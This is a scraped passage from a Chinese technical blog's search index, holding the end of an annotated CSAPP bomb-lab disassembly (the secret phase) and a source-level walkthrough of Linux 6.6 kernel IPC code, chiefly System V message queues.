\u0026lt;n45+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6031f0 \u0026lt;n41\u0026gt;: 0x00000001 0x00000000 0x00000000 0x00000000 #0x603200 \u0026lt;n41+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603210 \u0026lt;n47\u0026gt;: 0x00000063 0x00000000 0x00000000 0x00000000 #0x603220 \u0026lt;n47+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603230 \u0026lt;n44\u0026gt;: 0x00000023 0x00000000 0x00000000 0x00000000 #0x603240 \u0026lt;n44+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603250 \u0026lt;n42\u0026gt;: 0x00000007 0x00000000 0x00000000 0x00000000 #0x603260 \u0026lt;n42+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603270 \u0026lt;n43\u0026gt;: 0x00000014 0x00000000 0x00000000 0x00000000 #0x603280 \u0026lt;n43+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603290 \u0026lt;n46\u0026gt;: 0x0000002f 0x00000000 0x00000000 0x00000000 #0x6032a0 \u0026lt;n46+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6032b0 \u0026lt;n48\u0026gt;: 0x000003e9 0x00000000 0x00000000 0x00000000 #0x6032c0 \u0026lt;n48+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx #edx=10 第三个参数 40124d:\tbe 00 00 00 00 mov $0x0,%esi #esi=0 第二个参数 401252:\t48 89 c7 mov %rax,%rdi #rdi=rax 第一个参数 401255:\te8 76 f9 ff ff call 400bd0 \u0026lt;strtol@plt\u0026gt; #将字符串转为长整型 40125a:\t48 89 c3 mov %rax,%rbx #rbx=rax 40125d:\t8d 40 ff lea -0x1(%rax),%eax #eax=rax-1 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #eax与1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; #若eax\u0026lt;=1000,则跳转到0x40126c 401267:\te8 ce 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 40126c:\t89 de mov %ebx,%esi #esi=ebx 第二个参数为转化后的长整型数字 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi #edi=0x6930f0 第一个参数 401273:\te8 8c ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax #比较eax和2 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt; #若eax=2，跳转到0x401282,所以func7函数返回值必须要等于2 40127d:\te8 b8 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 401282:\tbf 38 24 40 00 mov $0x402438,%edi #edi=0x402438 401287:\te8 84 f8 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 call 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 注意：彩蛋要在输入6个关卡的答案后才会出现。\n","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu16866174452783611002.jpg","permalink":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bomb实验"},{"content":"进程间通信（IPC）源码分析 本调研报告主要分析6.6内核版本的IPC源码部分。\n**进程间通信（IPC，InterProcess Communication）**是指在不同进程之间传播或交换信息。IPC的方式通常有管道（包括无名管道和命名管道）、消息队列、信号量、共享存储、Socket、Streams等。其中 Socket和Streams支持不同主机上的两个进程IPC。\n管道pipe：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父子进程关系。 消息队列MessageQueue：消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。 共享内存SharedMemory：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号量，配合使用，来实现进程间的同步和通信。 信号 ( signal ) ： 信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生。 信号量Semaphore：信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。 套接字Socket：套接字也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信 IPC（Inter-Process Communication，进程间通信）相关的代码主要位于内核源码树的ipc目录下（主要是信号量、共享内存以及消息队列），管道和命名管道的实现主要在fs/pipe.c文件中，套接字主要分布在net目录下。\nIPC目录源码分析： compat.c：\n这个文件包含了兼容性代码，确保IPC机制在不同版本的Linux内核或不同硬件架构上正常工作。 ipc_sysctl.c：\n这个文件管理IPC的系统控制（sysctl）接口。Sysctl允许在运行时读取和修改内核参数，这个文件处理与IPC相关的参数。 mq_sysctl.c：\n类似于ipc_sysctl.c，但专门用于消息队列（MQ）。它管理消息队列IPC机制的sysctl接口参数。 mqueue.c：\n这个文件实现了消息队列功能。消息队列用于在进程之间发送和接收消息，提供一种IPC方法。 msg.c：\n这个文件可能处理System V消息队列的实现，这是类Unix操作系统中另一种消息传递IPC机制。 msgutil.c：\n包含消息队列的实用函数。这些函数可能协助完成消息队列的常见操作，例如创建、删除和管理消息缓冲区。 namespace.c：\nIPC命名空间，管理IPC命名空间的创建、销毁及相关操作。\n核心函数：\n1、inc_ipc_namespaces 和 dec_ipc_namespaces\n这两个函数用于增加和减少IPC命名空间的引用计数，确保正确管理命名空间的生命周期。\n2、create_ipc_ns创建一个新的IPC命名空间，包括初始化相关的数据结构和资源\n3、copy_ipcs\n这个函数在创建新进程时复制IPC命名空间。如果CLONE_NEWIPC标志被设置，则创建新的命名空间，否则返回现有的命名空间。\n4、free_ipcs\n这个函数释放某个命名空间中的所有IPC资源。\n5、free_ipc_ns\n这个函数释放IPC命名空间，包括相关资源的清理工作。\n6、put_ipc_ns\n这个函数用于减少IPC命名空间的引用计数，并在引用计数为0时释放命名空间。\n7、ipcns_get, ipcns_put, ipcns_install, ipcns_owner\n这些函数是针对IPC命名空间的操作接口，提供了获取、释放、安装和获取所有者等功能。\nsem.c：\n这个文件实现了信号量功能，一种用于控制多个进程对共享资源访问的同步机制。 shm.c：\n这个文件处理共享内存段，允许多个进程访问相同的内存空间进行IPC。共享内存是最快的IPC机制之一。 syscall.c：\n实现了一个旧的SysV IPC系统调用多路复用器 sys_ipc，并提供了一个新的系统调用 ksys_ipc 来处理各种IPC操作。这些操作包括信号量、消息队列和共享内存的创建、控制和操作。代码还包含了兼容性处理，以支持32位和64位系统之间的交互。\n核心函数：\n1、 ksys_ipc 函数\nksys_ipc 是实际处理IPC请求的核心函数。它根据传入的 call 参数确定具体的IPC操作，并调用相应的内核函数来处理具体的IPC操作。\n2、compat_ksys_ipc函数\n与上面那个函数一样，不过是做了一些兼容性处理。\n3、这个宏定义了一个新的系统调用 ipc，它接收6个参数，并将这些参数传递给 ksys_ipc 函数进行处理。\n1 2 3 4 5 SYSCALL_DEFINE6(ipc, unsigned int, call, int, first, unsigned long, second, unsigned long, third, void __user *, ptr, long, fifth) { return ksys_ipc(call, first, second, third, ptr, fifth); } util.c：\n包含在不同IPC机制中共享的实用函数。这些函数可能包括内存分配、错误处理或其他通用任务的辅助函数。用于初始化和管理 Linux 系统的 System V IPC（进程间通信）机制的一个模块。System V IPC 包括信号量（sem）、消息队列（msg）和共享内存（shm）。代码涉及 IPC 对象的创建、查找、权限检查、以及 ID 管理等操作。\n核心函数:\n1、结构体定义\n1 2 3 4 5 6 struct ipc_proc_iface { const char *path; const char *header; int ids; int (*show)(struct seq_file *, void *); }; ipc_proc_iface 结构体定义了在 /proc 文件系统中显示 IPC 信息的接口。\n2、初始化函数\n1 2 3 4 5 6 7 8 static int __init ipc_init(void) { proc_mkdir(\u0026#34;sysvipc\u0026#34;, NULL); sem_init(); msg_init(); shm_init(); return 0; } device_initcall(ipc_init); ipc_init 函数用于初始化 IPC 子系统，创建 /proc/sysvipc 目录，并调用信号量、消息队列和共享内存的初始化函数。\n3、哈希表参数\n1 2 3 4 5 6 static const struct rhashtable_params ipc_kht_params = { .head_offset = offsetof(struct kern_ipc_perm, khtnode), .key_offset = offsetof(struct kern_ipc_perm, key), .key_len = sizeof_field(struct kern_ipc_perm, key), .automatic_shrinking = true, }; ipc_kht_params 定义了 IPC 对象哈希表的参数，包括头部偏移、键偏移和键长度。\n4、IPC ID 初始化\n1 2 3 4 5 6 7 8 9 10 11 12 void ipc_init_ids(struct ipc_ids *ids) { ids-\u0026gt;in_use = 0; ids-\u0026gt;seq = 0; init_rwsem(\u0026amp;ids-\u0026gt;rwsem); rhashtable_init(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;ipc_kht_params); idr_init(\u0026amp;ids-\u0026gt;ipcs_idr); ids-\u0026gt;max_idx = -1; ids-\u0026gt;last_idx = -1; #ifdef CONFIG_CHECKPOINT_RESTORE ids-\u0026gt;next_id = -1; #endif } ipc_init_ids 函数初始化 IPC 标识符集，设置初始值并初始化哈希表和 ID 管理器。\n5、进程接口初始化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #ifdef CONFIG_PROC_FS static const struct proc_ops sysvipc_proc_ops; void __init ipc_init_proc_interface(const char *path, const char *header, int ids, int (*show)(struct seq_file *, void *)) { struct proc_dir_entry *pde; struct ipc_proc_iface *iface; iface = kmalloc(sizeof(*iface), GFP_KERNEL); if (!iface) return; iface-\u0026gt;path = path; iface-\u0026gt;header = header; iface-\u0026gt;ids = ids; iface-\u0026gt;show = show; pde = proc_create_data(path, S_IRUGO, NULL, \u0026amp;sysvipc_proc_ops, iface); if (!pde) kfree(iface); } #endif ipc_init_proc_interface 函数创建 /proc 文件系统中的 IPC 信息接口。\n6、查找 IPC 键\n1 2 3 4 5 6 7 8 9 10 11 static struct kern_ipc_perm *ipc_findkey(struct ipc_ids *ids, key_t key) { struct kern_ipc_perm *ipcp; ipcp = rhashtable_lookup_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;key, ipc_kht_params); if (!ipcp) return NULL; rcu_read_lock(); ipc_lock_object(ipcp); return ipcp; } ipc_findkey 函数在哈希表中查找给定键的 IPC 对象，并返回该对象。\n7、ID 分配\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static inline int ipc_idr_alloc(struct ipc_ids *ids, struct kern_ipc_perm *new) { int idx, next_id = -1; #ifdef CONFIG_CHECKPOINT_RESTORE next_id = ids-\u0026gt;next_id; ids-\u0026gt;next_id = -1; #endif if (next_id \u0026lt; 0) { int max_idx; max_idx = max(ids-\u0026gt;in_use*3/2, ipc_min_cycle); max_idx = min(max_idx, ipc_mni); idx = idr_alloc_cyclic(\u0026amp;ids-\u0026gt;ipcs_idr, NULL, 0, max_idx, GFP_NOWAIT); if (idx \u0026gt;= 0) { if (idx \u0026lt;= ids-\u0026gt;last_idx) { ids-\u0026gt;seq++; if (ids-\u0026gt;seq \u0026gt;= ipcid_seq_max()) ids-\u0026gt;seq = 0; } ids-\u0026gt;last_idx = idx; new-\u0026gt;seq = ids-\u0026gt;seq; idr_replace(\u0026amp;ids-\u0026gt;ipcs_idr, new, idx); } } else { new-\u0026gt;seq = ipcid_to_seqx(next_id); idx = idr_alloc(\u0026amp;ids-\u0026gt;ipcs_idr, new, ipcid_to_idx(next_id), 0, GFP_NOWAIT); } if (idx \u0026gt;= 0) new-\u0026gt;id = (new-\u0026gt;seq \u0026lt;\u0026lt; ipcmni_seq_shift()) + idx; return idx; } ipc_idr_alloc 函数将一个新的IPC对象添加到IDR中，并且分配新的 IPC ID和设置 IPC 对象的序列号。\n8、添加一个IPC对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 int ipc_addid(struct ipc_ids *ids, struct kern_ipc_perm *new, int limit) { kuid_t euid; kgid_t egid; int idx, err; refcount_set(\u0026amp;new-\u0026gt;refcount, 1); if (limit \u0026gt; ipc_mni) limit = ipc_mni; if (ids-\u0026gt;in_use \u0026gt;= limit) return -ENOSPC; idr_preload(GFP_KERNEL); spin_lock_init(\u0026amp;new-\u0026gt;lock); rcu_read_lock(); spin_lock(\u0026amp;new-\u0026gt;lock); current_euid_egid(\u0026amp;euid, \u0026amp;egid); new-\u0026gt;cuid = new-\u0026gt;uid = euid; new-\u0026gt;gid = new-\u0026gt;cgid = egid; new-\u0026gt;deleted = false; idx = ipc_idr_alloc(ids, new); idr_preload_end(); if (idx \u0026gt;= 0 \u0026amp;\u0026amp; new-\u0026gt;key != IPC_PRIVATE) { err = rhashtable_insert_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;new-\u0026gt;khtnode, ipc_kht_params); if (err \u0026lt; 0) { idr_remove(\u0026amp;ids-\u0026gt;ipcs_idr, idx); idx = err; } } if (idx \u0026lt; 0) { new-\u0026gt;deleted = true; spin_unlock(\u0026amp;new-\u0026gt;lock); rcu_read_unlock(); return idx; } ids-\u0026gt;in_use++; if (idx \u0026gt; ids-\u0026gt;max_idx) ids-\u0026gt;max_idx = idx; return idx; } ipc_addid 函数将新的 IPC 对象添加到 IDR，并在哈希表中插入该对象。\n8、新建 IPC 对象\n1 2 3 4 5 6 7 8 static int ipcget_new(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { int err; down_write(\u0026amp;ids-\u0026gt;rwsem); err = ops-\u0026gt;getnew(ns, params); up_write(\u0026amp;ids-\u0026gt;rwsem); return err; } ipcget_new 函数创建一个新的 IPC 对象。\n9、检查 IPC 权限\n1 2 3 4 5 6 7 8 9 10 11 12 13 static int ipc_check_perms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, const struct ipc_ops *ops, struct ipc_params *params) { int err; if (ipcperms(ns, ipcp, params-\u0026gt;flg)) err = -EACCES; else { err = ops-\u0026gt;associate(ipcp, params-\u0026gt;flg); if (!err) err = ipcp-\u0026gt;id; } return err; } ipc_check_perms 函数检查 IPC 对象的权限。\n10、获取公共 IPC 对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 static int ipcget_public(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { struct kern_ipc_perm *ipcp; int flg = params-\u0026gt;flg; int err; down_write(\u0026amp;ids-\u0026gt;rwsem); ipcp = ipc_findkey(ids, params-\u0026gt;key); if (ipcp == NULL) { if (!(flg \u0026amp; IPC_CREAT)) err = -ENOENT; else err = ops-\u0026gt;getnew(ns, params); } else { if (flg \u0026amp; IPC_CREAT \u0026amp;\u0026amp; flg \u0026amp; IPC_EXCL) err = -EEXIST; else err = ipc_check_perms(ns, ipcp, ops, params); ipc_unlock_object(ipcp); } up_write(\u0026amp;ids-\u0026gt;rwsem); return err; } ipcget 函数是 IPC 对象的入口函数，根据键值决定是获取现有对象还是创建新对象。\n11、从哈希表中移除ipc\n1 2 3 4 5 6 static void ipc_kht_remove(struct ipc_ids *ids, struct kern_ipc_perm *ipcp) { if (ipcp-\u0026gt;key != IPC_PRIVATE) WARN_ON_ONCE(rhashtable_remove_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;ipcp-\u0026gt;khtnode, ipc_kht_params)); } ipc_kht_remove函数用于从哈希表移除ipc\n12、删除ipc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void ipc_rmid(struct ipc_ids *ids, struct kern_ipc_perm *ipcp) { int idx = ipcid_to_idx(ipcp-\u0026gt;id); WARN_ON_ONCE(idr_remove(\u0026amp;ids-\u0026gt;ipcs_idr, idx) != ipcp); ipc_kht_remove(ids, ipcp); ids-\u0026gt;in_use--; ipcp-\u0026gt;deleted = true; if (unlikely(idx == ids-\u0026gt;max_idx)) { idx = ids-\u0026gt;max_idx-1; if (idx \u0026gt;= 0) idx = ipc_search_maxidx(ids, idx); ids-\u0026gt;max_idx = idx; } } ipc_rmid函数用于移除ipc\n其余函数未全部列出\nutil.h：\n与util.c相关的头文件。它声明了util.c中定义的函数和变量，使它们对IPC子系统的其他部分可访问 Linux 内核提供了多种 IPC 机制，其中System V IPC 包括：System V 信号量、System V消息队列、System V 共享内存。这三种通信机制有很多相似之处。\n创建流程如下：\n消息队列 消息队列，是消息的链接表，存放在内核中。一个消息队列由一个标识符（即队列ID）来标识。\n消息队列（Message Queue,简称MQ）是由内核管理的消息链接表，由消息队列标识符标识，标识符简称队列ID。消息队列提供了进程之间单向传送数据的方法，每个消息包含有一个正的长整型类型的数据段、一个非负的长度以及实际数据字节数（对应于长度），消息队列总字节数是有上限的，系统上消息队列总数也有上限。\nMQ传递的是消息，也就是进程间需要传递的数据，系统内核中有很多MQ，这些MQ采用链表实现并由系统内核维护，每个MQ用消息队列描述符（qid)来区分，每个MQ 的pid具有唯一性。\n原型 1 2 3 4 5 6 7 8 9 #include \u0026lt;sys/msg.h\u0026gt; // 创建或打开消息队列：成功返回队列ID，失败返回-1 int msgget(key_t key, int flag); // 添加消息：成功返回0，失败返回-1 int msgsnd(int msqid, const void *ptr, size_t size, int flag); // 读取消息：成功返回消息数据的长度，失败返回-1 int msgrcv(int msqid, void *ptr, size_t size, long type,int flag); // 控制消息队列：成功返回0，失败返回-1 int msgctl(int msqid, int cmd, struct msqid_ds *buf); 在以下两种情况下，msgget将创建一个新的消息队列：\n如果没有与键值key相对应的消息队列，并且flag中包含了IPC_CREAT标志位。 key参数为IPC_PRIVATE。 函数msgrcv在读取消息队列时，type参数有下面几种情况：\ntype == 0，返回队列中的第一个消息； type \u0026gt; 0，返回队列中消息类型为 type 的第一个消息； type \u0026lt; 0，返回队列中消息类型值小于或等于 type 绝对值的消息，如果有多个，则取类型值最小的消息。 主要结构体 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 /* one msq_queue structure for each present queue on the system */ struct msg_queue { struct kern_ipc_perm q_perm; time64_t q_stime;\t/* last msgsnd time */ time64_t q_rtime;\t/* last msgrcv time */ time64_t q_ctime;\t/* last change time */ unsigned long q_cbytes;\t/* current number of bytes on queue */ unsigned long q_qnum;\t/* number of messages in queue */ unsigned long q_qbytes;\t/* max number of bytes on queue */ struct pid *q_lspid;\t/* pid of last msgsnd */ struct pid *q_lrpid;\t/* last receive pid */ struct list_head q_messages; struct list_head q_receivers; struct list_head q_senders; } __randomize_layout; /* one msg_receiver structure for each sleeping receiver */ struct msg_receiver { struct list_head\tr_list; struct task_struct\t*r_tsk; int\tr_mode; long\tr_msgtype; long\tr_maxsize; struct msg_msg\t*r_msg; }; /* one msg_sender for each sleeping sender */ struct msg_sender { struct list_head\tlist; struct task_struct\t*tsk; size_t msgsz; }; 核心函数 msgget函数实现负责创建或打开消息队列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 long ksys_msgget(key_t key, int msgflg) { struct ipc_namespace *ns; static const struct ipc_ops msg_ops = { .getnew = newque, .associate = security_msg_queue_associate, }; struct ipc_params msg_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; msg_params.key = key; msg_params.flg = msgflg; return ipcget(ns, \u0026amp;msg_ids(ns), \u0026amp;msg_ops, \u0026amp;msg_params); } msgsnd函数实际由do_msgsnd函数实现，负责对消息的发送。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 static long do_msgsnd(int msqid, long mtype, void __user *mtext, size_t msgsz, int msgflg) { struct msg_queue *msq; struct msg_msg *msg; int err; struct ipc_namespace *ns; DEFINE_WAKE_Q(wake_q); ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (msgsz \u0026gt; ns-\u0026gt;msg_ctlmax || (long) msgsz \u0026lt; 0 || msqid \u0026lt; 0) return -EINVAL; if (mtype \u0026lt; 1) return -EINVAL; msg = load_msg(mtext, msgsz); if (IS_ERR(msg)) return PTR_ERR(msg); msg-\u0026gt;m_type = mtype; msg-\u0026gt;m_ts = msgsz; rcu_read_lock(); msq = msq_obtain_object_check(ns, msqid); if (IS_ERR(msq)) { err = PTR_ERR(msq); goto out_unlock1; } ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); for (;;) { struct msg_sender s; err = -EACCES; if (ipcperms(ns, \u0026amp;msq-\u0026gt;q_perm, S_IWUGO)) goto out_unlock0; /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } err = security_msg_queue_msgsnd(\u0026amp;msq-\u0026gt;q_perm, msg, msgflg); if (err) goto out_unlock0; if (msg_fits_inqueue(msq, msgsz)) break; /* queue full, wait: */ if (msgflg \u0026amp; IPC_NOWAIT) { err = -EAGAIN; goto out_unlock0; } /* enqueue the sender and prepare to block */ ss_add(msq, \u0026amp;s, msgsz); if (!ipc_rcu_getref(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); rcu_read_unlock(); schedule(); rcu_read_lock(); ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); ipc_rcu_putref(\u0026amp;msq-\u0026gt;q_perm, msg_rcu_free); /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ss_del(\u0026amp;s); if (signal_pending(current)) { err = -ERESTARTNOHAND; goto out_unlock0; } } ipc_update_pid(\u0026amp;msq-\u0026gt;q_lspid, task_tgid(current)); msq-\u0026gt;q_stime = ktime_get_real_seconds(); if (!pipelined_send(msq, msg, \u0026amp;wake_q)) { /* no one is waiting for this message, enqueue it */ list_add_tail(\u0026amp;msg-\u0026gt;m_list, \u0026amp;msq-\u0026gt;q_messages); msq-\u0026gt;q_cbytes += msgsz; msq-\u0026gt;q_qnum++; percpu_counter_add_local(\u0026amp;ns-\u0026gt;percpu_msg_bytes, msgsz); percpu_counter_add_local(\u0026amp;ns-\u0026gt;percpu_msg_hdrs, 1); } err = 0; msg = NULL; out_unlock0: ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); wake_up_q(\u0026amp;wake_q); out_unlock1: rcu_read_unlock(); if (msg != NULL) free_msg(msg); return err; } msgrcv函数实际由do_msgrcv函数实现，实现对消息的接收。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg, long (*msg_handler)(void __user *, struct msg_msg *, size_t)) { int mode; struct msg_queue *msq; struct ipc_namespace *ns; struct msg_msg *msg, *copy = NULL; DEFINE_WAKE_Q(wake_q); ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (msqid \u0026lt; 0 || (long) bufsz \u0026lt; 0) return -EINVAL; if (msgflg \u0026amp; MSG_COPY) { if ((msgflg \u0026amp; MSG_EXCEPT) || !(msgflg \u0026amp; IPC_NOWAIT)) return -EINVAL; copy = prepare_copy(buf, min_t(size_t, bufsz, ns-\u0026gt;msg_ctlmax)); if (IS_ERR(copy)) return PTR_ERR(copy); } mode = convert_mode(\u0026amp;msgtyp, msgflg); rcu_read_lock(); msq = msq_obtain_object_check(ns, msqid); if (IS_ERR(msq)) { rcu_read_unlock(); free_copy(copy); return PTR_ERR(msq); } for (;;) { struct msg_receiver msr_d; msg = ERR_PTR(-EACCES); if (ipcperms(ns, \u0026amp;msq-\u0026gt;q_perm, S_IRUGO)) goto out_unlock1; ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { msg = ERR_PTR(-EIDRM); goto out_unlock0; } msg = find_msg(msq, \u0026amp;msgtyp, mode); if (!IS_ERR(msg)) { /* * Found a suitable message. * Unlink it from the queue. */ if ((bufsz \u0026lt; msg-\u0026gt;m_ts) \u0026amp;\u0026amp; !(msgflg \u0026amp; MSG_NOERROR)) { msg = ERR_PTR(-E2BIG); goto out_unlock0; } /* * If we are copying, then do not unlink message and do * not update queue parameters. */ if (msgflg \u0026amp; MSG_COPY) { msg = copy_msg(msg, copy); goto out_unlock0; } list_del(\u0026amp;msg-\u0026gt;m_list); msq-\u0026gt;q_qnum--; msq-\u0026gt;q_rtime = ktime_get_real_seconds(); ipc_update_pid(\u0026amp;msq-\u0026gt;q_lrpid, task_tgid(current)); msq-\u0026gt;q_cbytes -= msg-\u0026gt;m_ts; percpu_counter_sub_local(\u0026amp;ns-\u0026gt;percpu_msg_bytes, msg-\u0026gt;m_ts); percpu_counter_sub_local(\u0026amp;ns-\u0026gt;percpu_msg_hdrs, 1); ss_wakeup(msq, \u0026amp;wake_q, false); goto out_unlock0; } /* No message waiting. Wait for a message */ if (msgflg \u0026amp; IPC_NOWAIT) { msg = ERR_PTR(-ENOMSG); goto out_unlock0; } list_add_tail(\u0026amp;msr_d.r_list, \u0026amp;msq-\u0026gt;q_receivers); msr_d.r_tsk = current; msr_d.r_msgtype = msgtyp; msr_d.r_mode = mode; if (msgflg \u0026amp; MSG_NOERROR) msr_d.r_maxsize = INT_MAX; else msr_d.r_maxsize = bufsz; /* memory barrier not require due to ipc_lock_object() */ WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN)); /* memory barrier not required, we own ipc_lock_object() */ __set_current_state(TASK_INTERRUPTIBLE); ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); rcu_read_unlock(); schedule(); /* * Lockless receive, part 1: * We don\u0026#39;t hold a reference to the queue and getting a * reference would defeat the idea of a lockless operation, * thus the code relies on rcu to guarantee the existence of * msq: * Prior to destruction, expunge_all(-EIRDM) changes r_msg. * Thus if r_msg is -EAGAIN, then the queue not yet destroyed. */ rcu_read_lock(); /* * Lockless receive, part 2: * The work in pipelined_send() and expunge_all(): * - Set pointer to message * - Queue the receiver task for later wakeup * - Wake up the process after the lock is dropped. * * Should the process wake up before this wakeup (due to a * signal) it will either see the message and continue ... */ msg = READ_ONCE(msr_d.r_msg); if (msg != ERR_PTR(-EAGAIN)) { /* see MSG_BARRIER for purpose/pairing */ smp_acquire__after_ctrl_dep(); goto out_unlock1; } /* * ... or see -EAGAIN, acquire the lock to check the message * again. */ ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); msg = READ_ONCE(msr_d.r_msg); if (msg != ERR_PTR(-EAGAIN)) goto out_unlock0; list_del(\u0026amp;msr_d.r_list); if (signal_pending(current)) { msg = ERR_PTR(-ERESTARTNOHAND); goto out_unlock0; } ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); } out_unlock0: ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); wake_up_q(\u0026amp;wake_q); out_unlock1: rcu_read_unlock(); if (IS_ERR(msg)) { free_copy(copy); return PTR_ERR(msg); } bufsz = msg_handler(buf, msg, bufsz); free_msg(msg); return bufsz; } long ksys_msgrcv(int msqid, struct msgbuf __user *msgp, size_t msgsz, long msgtyp, int msgflg) { return do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill); } ksys_msgctl函数负责控制消息队列，根据具体cmd选择不同的操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 static long ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *buf, int version) { struct ipc_namespace *ns; struct msqid64_ds msqid64; int err; if (msqid \u0026lt; 0 || cmd \u0026lt; 0) return -EINVAL; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; switch (cmd) { case IPC_INFO: case MSG_INFO: { struct msginfo msginfo; err = msgctl_info(ns, msqid, cmd, \u0026amp;msginfo); if (err \u0026lt; 0) return err; if (copy_to_user(buf, \u0026amp;msginfo, sizeof(struct msginfo))) err = -EFAULT; return err; } case MSG_STAT:\t/* msqid is an index rather than a msg queue id */ case MSG_STAT_ANY: case IPC_STAT: err = msgctl_stat(ns, msqid, cmd, \u0026amp;msqid64); if (err \u0026lt; 0) return err; if (copy_msqid_to_user(buf, \u0026amp;msqid64, version)) err = 